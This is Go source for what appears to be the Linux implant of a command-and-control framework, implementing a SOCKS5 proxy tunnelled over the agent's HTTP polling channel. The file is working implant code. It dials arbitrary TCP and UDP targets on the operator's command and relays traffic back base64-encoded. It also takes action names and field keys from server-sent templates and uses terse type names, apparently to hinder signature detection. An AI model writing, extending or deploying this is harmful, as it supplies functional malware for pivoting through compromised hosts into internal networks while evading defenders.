// server/docker/payloads/Linux/action_socks_http.go
// HTTP-based SOCKS handler that uses the normal polling mechanism.
// Enables SOCKS proxying through linked agents without dedicated WebSocket connections.

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// Template indices - must match server's common.go
const (
	// TCP indices
	idxSocksHTTPActionConnect   = 1060
	idxSocksHTTPActionData      = 1061
	idxSocksHTTPActionClose     = 1062
	idxSocksHTTPStatusConnected = 1063
	idxSocksHTTPStatusData      = 1064
	idxSocksHTTPStatusClosed    = 1065
	idxSocksHTTPStatusError     = 1066
	idxSocksHTTPFieldSid        = 1067
	idxSocksHTTPFieldStatus     = 1068
	idxSocksHTTPFieldData       = 1069
	idxSocksHTTPFieldError      = 1070
	// UDP indices
	idxSocksHTTPActionUDPAssoc  = 1080
	idxSocksHTTPActionUDPData   = 1081
	idxSocksHTTPActionUDPClose  = 1082
	idxSocksHTTPStatusUDPReady  = 1083
	idxSocksHTTPStatusUDPData   = 1084
	idxSocksHTTPStatusUDPClosed = 1085
	idxSocksHTTPFieldDestAddr   = 1086
	idxSocksHTTPFieldDestPort   = 1087
	idxSocksHTTPFieldFrag       = 1088
	idxSocksHTTPFieldAtyp       = 1089
)

// SOCKS5 address types
const (
	addrTypeIPv4   = 0x01
	addrTypeDomain = 0x03
	addrTypeIPv6   = 0x04
)

// PxCmd handles HTTP-based SOCKS proxy sessions
type PxCmd struct {
	sessions    map[string]*TgtSess
	udpSessions map[string]*UTgtSess
	sessionsMu  sync.RWMutex
	running     bool
	ctx         *OpCtx
	// Pending responses to be included in next POST
	pendingResponses []*PxResp
	pendingMu        sync.Mutex
	// Cached template strings
	template   []string
	templateMu sync.RWMutex
}

// TgtSess represents a TCP connection to a target host
type TgtSess struct {
	mu           sync.RWMutex
	ID           string
	TargetConn   net.Conn
	State        int // 0=connecting, 1=connected, 2=closed
	LastActivity time.Time
	readDone     chan struct{}
}

// UTgtSess represents a UDP relay session
type UTgtSess struct {
	mu           sync.RWMutex
	ID           string
	UDPConn      *net.UDPConn
	State        int // 0=connecting, 1=connected, 2=closed
	LastActivity time.Time
	stopCh       chan struct{}
}

// PxResp is sent back to the server
type PxResp struct {
	SI string `json:"sid"`
	Status    string `json:"st"`  // connected, data, closed, error, udp_ready, udp_data, udp_closed
	Data      string `json:"d"`   // Base64 encoded data
	Error     string `json:"err"` // Error message
	// UDP-specific fields
	DA string `json:"da,omitempty"`      // Destination/source address
	DP uint16 `json:"dp,omitempty"`      // Destination/source port
	AT byte   `json:"at_type,omitempty"` // Address type
}

// Global SOCKS HTTP handler instance
var socksHTTPHandler *PxCmd
var socksHTTPOnce sync.Once

// GetSocksHTTPHandler returns the singleton SOCKS HTTP handler
func GetSocksHTTPHandler() *PxCmd {
	socksHTTPOnce.Do(func() {
		socksHTTPHandler = &PxCmd{
			sessions:         make(map[string]*TgtSess),
			udpSessions:      make(map[string]*UTgtSess),
			running:          true,
			pendingResponses: make([]*PxResp, 0),
		}
		// Start cleanup goroutine
		go socksHTTPHandler.cleanupStaleSessions()
	})
	return socksHTTPHandler
}

func (c *PxCmd) execute(ctx *OpCtx, args []string) OpResult {
	c.ctx = ctx

	// Get the JSON data from the CurrentMsg in context
	var rawData string
	ctx.mu.RLock()
	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
		rawData = ctx.CurrentMsg.Data
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		return OpResult{
			Error:       fmt.Errorf("%s", Err(E1)),
			EStr: Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Parse SOCKS HTTP command with template support
	var cmdData struct {
		Type      int      `json:"t"`
		Version   int      `json:"v"`
		Action    string   `json:"at"`
		SI string   `json:"sid"`
		Dest      string   `json:"dst"`
		Data      string   `json:"d"`
		Templates []string `json:"tpl"` // Template strings from server
		// UDP-specific fields
		DA string `json:"da,omitempty"`
		DP uint16 `json:"dp,omitempty"`
		AT byte   `json:"at_type,omitempty"`
		Frag     byte   `json:"fg,omitempty"`
	}

	if err := json.Unmarshal([]byte(rawData), &cmdData); err != nil {
		return OpResult{
			Error:       err,
			EStr: Err(E18),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Cache template if provided (sent with first connect command)
	if len(cmdData.Templates) > 0 {
		c.templateMu.Lock()
		c.template = cmdData.Templates
		c.templateMu.Unlock()
	}

	// Get action strings from template (server always provides these)
	actConnect := c.getTpl(idxSocksHTTPActionConnect)
	actData := c.getTpl(idxSocksHTTPActionData)
	actClose := c.getTpl(idxSocksHTTPActionClose)
	actUDPAssoc := c.getTpl(idxSocksHTTPActionUDPAssoc)
	actUDPData := c.getTpl(idxSocksHTTPActionUDPData)
	actUDPClose := c.getTpl(idxSocksHTTPActionUDPClose)

	switch cmdData.Action {
	case actConnect:
		return c.handleConnect(cmdData.SI, cmdData.Dest)
	case actData:
		return c.handleData(cmdData.SI, cmdData.Data)
	case actClose:
		return c.handleClose(cmdData.SI)
	case actUDPAssoc:
		return c.handleUDPAssociate(cmdData.SI)
	case actUDPData:
		return c.handleUDPData(cmdData.SI, cmdData.DA, cmdData.DP, cmdData.AT, cmdData.Data)
	case actUDPClose:
		return c.handleUDPClose(cmdData.SI)
	default:
		return OpResult{
			Error:       fmt.Errorf("%s", ErrCtx(E21, cmdData.Action)),
			EStr: ErrCtx(E21, cmdData.Action),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}
}

// getTpl returns template string at index
func (c *PxCmd) getTpl(idx int) string {
	c.templateMu.RLock()
	defer c.templateMu.RUnlock()
	if c.template != nil && idx < len(c.template) {
		return c.template[idx]
	}
	return ""
}

func (c *PxCmd) handleConnect(sessionID, dest string) OpResult {
	// Dial TCP to destination with timeout
	conn, err := net.DialTimeout("tcp", dest, 30*time.Second)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E43),
		})
		return OpResult{
			Output:      ErrCtx(E43, dest),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Create session
	session := &TgtSess{
		ID:           sessionID,
		TargetConn:   conn,
		State:        1, // connected
		LastActivity: time.Now(),
		readDone:     make(chan struct{}),
	}

	c.sessionsMu.Lock()
	c.sessions[sessionID] = session
	c.sessionsMu.Unlock()

	// Queue success response
	c.queueResponse(&PxResp{
		SI: sessionID,
		Status:    c.getTpl(idxSocksHTTPStatusConnected),
	})

	// Start goroutine to read from target
	go c.readFromTarget(session)

	return OpResult{
		Output:      SuccCtx(S4, dest),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

func (c *PxCmd) handleData(sessionID, data string) OpResult {
	c.sessionsMu.RLock()
	session, exists := c.sessions[sessionID]
	c.sessionsMu.RUnlock()

	if !exists {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E40),
		})
		return OpResult{
			Output:      Err(E40),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Decode data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E41),
		})
		return OpResult{
			Output:      Err(E41),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Update activity
	session.mu.Lock()
	session.LastActivity = time.Now()
	session.mu.Unlock()

	// Write to target
	_, err = session.TargetConn.Write(decoded)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E44),
		})
		c.closeSession(sessionID)
		return OpResult{
			Output:      Err(E44),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	return OpResult{
		Output:      SuccCtx(S0, fmt.Sprintf("%d", len(decoded))),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

func (c *PxCmd) handleClose(sessionID string) OpResult {
	c.closeSession(sessionID)
	return OpResult{
		Output:      Succ(S2),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

// handleUDPAssociate sets up a UDP relay session
func (c *PxCmd) handleUDPAssociate(sessionID string) OpResult {
	// Create a UDP socket for sending/receiving
	udpAddr, err := net.ResolveUDPAddr("udp", "0.0.0.0:0")
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E45),
		})
		return OpResult{
			Output:      Err(E45),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	udpConn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E46),
		})
		return OpResult{
			Output:      Err(E46),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Create UDP session
	session := &UTgtSess{
		ID:           sessionID,
		UDPConn:      udpConn,
		State:        1, // connected
		LastActivity: time.Now(),
		stopCh:       make(chan struct{}),
	}

	c.sessionsMu.Lock()
	c.udpSessions[sessionID] = session
	c.sessionsMu.Unlock()

	// Queue success response
	c.queueResponse(&PxResp{
		SI: sessionID,
		Status:    c.getTpl(idxSocksHTTPStatusUDPReady),
	})

	// Start goroutine to read UDP responses
	go c.readFromUDPTarget(session)

	return OpResult{
		Output:      Succ(S4),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

// handleUDPData sends UDP data to a target
func (c *PxCmd) handleUDPData(sessionID, destAddr string, destPort uint16, addrType byte, data string) OpResult {
	c.sessionsMu.RLock()
	session, exists := c.udpSessions[sessionID]
	c.sessionsMu.RUnlock()

	if !exists {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E40),
		})
		return OpResult{
			Output:      Err(E40),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Decode data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E41),
		})
		return OpResult{
			Output:      Err(E41),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Resolve destination address
	dest := fmt.Sprintf("%s:%d", destAddr, destPort)
	udpAddr, err := net.ResolveUDPAddr("udp", dest)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     ErrCtx(E45, dest),
		})
		return OpResult{
			Output:      ErrCtx(E45, dest),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Update activity
	session.mu.Lock()
	session.LastActivity = time.Now()
	session.mu.Unlock()

	// Send UDP packet
	_, err = session.UDPConn.WriteToUDP(decoded, udpAddr)
	if err != nil {
		c.queueResponse(&PxResp{
			SI: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E44),
		})
		return OpResult{
			Output:      Err(E44),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	return OpResult{
		Output:      SuccCtx(S0, fmt.Sprintf("%d:%s", len(decoded), dest)),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

// handleUDPClose closes a UDP session
func (c *PxCmd) handleUDPClose(sessionID string) OpResult {
	c.closeUDPSession(sessionID)
	return OpResult{
		Output:      Succ(S2),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}
}

// readFromUDPTarget reads UDP responses and queues them for the server
func (c *PxCmd) readFromUDPTarget(session *UTgtSess) {
	defer c.closeUDPSession(session.ID)

	buf := make([]byte, 65535)
	for {
		select {
		case <-session.stopCh:
			return
		default:
		}

		// Set read deadline to allow checking stopCh
		session.UDPConn.SetReadDeadline(time.Now().Add(5 * time.Second))

		n, remoteAddr, err := session.UDPConn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			session.mu.RLock()
			state := session.State
			session.mu.RUnlock()
			if state == 1 {
				c.queueResponse(&PxResp{
					SI: session.ID,
					Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
				})
			}
			return
		}

		if n > 0 {
			session.mu.Lock()
			session.LastActivity = time.Now()
			session.mu.Unlock()

			// Determine address type
			var addrType byte = addrTypeIPv4
			destAddr := remoteAddr.IP.String()
			if remoteAddr.IP.To4() == nil {
				addrType = addrTypeIPv6
			}

			// Queue UDP data response
			c.queueResponse(&PxResp{
				SI: session.ID,
				Status:    c.getTpl(idxSocksHTTPStatusUDPData),
				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
				DA:  destAddr,
				DP:  uint16(remoteAddr.Port),
				AT:  addrType,
			})
		}
	}
}

// closeUDPSession closes a UDP session
func (c *PxCmd) closeUDPSession(sessionID string) {
	c.sessionsMu.Lock()
	session, exists := c.udpSessions[sessionID]
	if exists {
		session.mu.Lock()
		session.State = 2 // closed
		session.mu.Unlock()
		close(session.stopCh)
		if session.UDPConn != nil {
			session.UDPConn.Close()
		}
		delete(c.udpSessions, sessionID)
	}
	c.sessionsMu.Unlock()
}

func (c *PxCmd) readFromTarget(session *TgtSess) {
	defer func() {
		close(session.readDone)
		c.closeSession(session.ID)
	}()

	buf := make([]byte, 32*1024)
	for {
		// Set read deadline to detect stale connections
		session.TargetConn.SetReadDeadline(time.Now().Add(30 * time.Second))

		n, err := session.TargetConn.Read(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue // retry on timeout, don't close
			}
			if err != io.EOF {
				// Only queue error if not a normal close
				session.mu.RLock()
				state := session.State
				session.mu.RUnlock()
				if state == 1 {
					c.queueResponse(&PxResp{
						SI: session.ID,
						Status:    c.getTpl(idxSocksHTTPStatusClosed),
					})
				}
			} else {
				c.queueResponse(&PxResp{
					SI: session.ID,
					Status:    c.getTpl(idxSocksHTTPStatusClosed),
				})
			}
			return
		}

		if n > 0 {
			session.mu.Lock()
			session.LastActivity = time.Now()
			session.mu.Unlock()

			// Queue data response
			c.queueResponse(&PxResp{
				SI: session.ID,
				Status:    c.getTpl(idxSocksHTTPStatusData),
				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
			})
		}
	}
}

func (c *PxCmd) closeSession(sessionID string) {
	c.sessionsMu.Lock()
	session, exists := c.sessions[sessionID]
	if exists {
		session.mu.Lock()
		session.State = 2 // closed
		session.mu.Unlock()
		if session.TargetConn != nil {
			session.TargetConn.Close()
		}
		delete(c.sessions, sessionID)
	}
	c.sessionsMu.Unlock()
}

func (c *PxCmd) queueResponse(resp *PxResp) {
	c.pendingMu.Lock()
	c.pendingResponses = append(c.pendingResponses, resp)
	c.pendingMu.Unlock()
}

// getPendingResponses returns and clears all pending SOCKS responses
// Called by the polling mechanism to include in POST payload
func (c *PxCmd) getPendingResponses() []*PxResp {
	c.pendingMu.Lock()
	defer c.pendingMu.Unlock()

	if len(c.pendingResponses) == 0 {
		return nil
	}

	responses := c.pendingResponses
	c.pendingResponses = make([]*PxResp, 0)
	return responses
}

func (c *PxCmd) cleanupStaleSessions() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()
		staleTimeout := 5 * time.Minute

		c.sessionsMu.RLock()
		var staleTCPIDs []string
		for id, session := range c.sessions {
			session.mu.RLock()
			lastActivity := session.LastActivity
			session.mu.RUnlock()
			if now.Sub(lastActivity) > staleTimeout {
				staleTCPIDs = append(staleTCPIDs, id)
			}
		}
		var staleUDPIDs []string
		for id, session := range c.udpSessions {
			session.mu.RLock()
			lastActivity := session.LastActivity
			session.mu.RUnlock()
			if now.Sub(lastActivity) > staleTimeout {
				staleUDPIDs = append(staleUDPIDs, id)
			}
		}
		c.sessionsMu.RUnlock()

		// Cleanup stale TCP sessions
		for _, id := range staleTCPIDs {
			c.queueResponse(&PxResp{
				SI: id,
				Status:    c.getTpl(idxSocksHTTPStatusClosed),
				Error:     Err(E42),
			})
			c.closeSession(id)
		}

		// Cleanup stale UDP sessions
		for _, id := range staleUDPIDs {
			c.queueResponse(&PxResp{
				SI: id,
				Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
				Error:     Err(E42),
			})
			c.closeUDPSession(id)
		}
	}
}

// hasPendingSocksResponses checks if there are pending SOCKS responses
func hasPendingSocksResponses() bool {
	handler := GetSocksHTTPHandler()
	handler.pendingMu.Lock()
	defer handler.pendingMu.Unlock()
	return len(handler.pendingResponses) > 0
}

// GetSocksHTTPResponses returns pending SOCKS responses for inclusion in POST
func GetSocksHTTPResponses() []map[string]interface{} {
	handler := GetSocksHTTPHandler()
	responses := handler.getPendingResponses()
	if len(responses) == 0 {
		return nil
	}

	result := make([]map[string]interface{}, len(responses))
	for i, resp := range responses {
		result[i] = map[string]interface{}{
			handler.getTpl(idxSocksHTTPFieldSid):    resp.SI,
			handler.getTpl(idxSocksHTTPFieldStatus): resp.Status,
		}
		if resp.Data != "" {
			result[i][handler.getTpl(idxSocksHTTPFieldData)] = resp.Data
		}
		if resp.Error != "" {
			result[i][handler.getTpl(idxSocksHTTPFieldError)] = resp.Error
		}
		if resp.DA != "" {
			result[i][handler.getTpl(idxSocksHTTPFieldDestAddr)] = resp.DA
		}
		if resp.DP != 0 {
			result[i][handler.getTpl(idxSocksHTTPFieldDestPort)] = resp.DP
		}
		if resp.AT != 0 {
			result[i][handler.getTpl(idxSocksHTTPFieldAtyp)] = resp.AT
		}
	}
	return result
}
